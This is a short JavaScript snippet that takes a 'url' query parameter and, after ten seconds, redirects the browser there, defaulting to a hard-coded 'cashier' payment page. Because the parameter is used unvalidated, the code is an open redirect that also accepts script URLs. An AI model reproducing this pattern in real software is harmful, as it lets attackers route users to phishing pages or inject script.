(() => {
	const urlParams = new URLSearchParams(window.location.search);
	let openUrl = urlParams.get('url');
	if (openUrl == undefined || openUrl == null || openUrl == '') {
		openUrl = "https://www.nzduojin002.top/cashier.html";
	}
	setTimeout(() => {
		location.href = openUrl;
	}, 10000);
})();
